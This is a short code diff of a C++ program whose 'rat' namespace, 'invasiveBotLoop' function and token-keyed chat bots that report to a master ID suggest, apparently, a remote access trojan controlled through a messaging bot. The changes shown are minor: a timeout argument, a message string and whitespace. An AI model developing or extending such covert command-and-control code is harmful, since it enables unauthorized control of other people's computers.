@@ -11,7 +11,6 @@
 #include <fmt/chrono.h>
 #include <fmt/core.h>
 
-
 static uint32_t empty_updates_count = 0;
 static uint32_t sleep_timout_ms = 500;
 
@@ -47,17 +46,19 @@ static void invasiveBotLoop() {
 static void botLoop(void) {
     DEBUG_LOG("Bot constructing");
     rat::tbot::Bot     bot(TOKEN1_odahimbotzawzum, MASTER_ID);
-    rat::tbot::BaseBot backing_bot(TOKEN_ODAHIMBOT , MASTER_ID);
-    
+    rat::tbot::BaseBot backing_bot(TOKEN_ODAHIMBOT , MASTER_ID, 60);
+        
     if (init_message.empty()) {
         init_message = fmt::format("Bot initialized at: {}", rat::system::getCurrentDateTime());
     }
 
     bot.sendMessage(init_message);
-    backing_bot.sendMessage(init_message);
+    backing_bot.sendMessage(fmt::format("{} wait for the session handler to start", init_message));
+    
     bot.setOffset();
     
     rat::handler::Handler session_handler(bot, backing_bot);
+    
     while (true) {
         try {
             rat::tbot::Update update = bot.getUpdate();
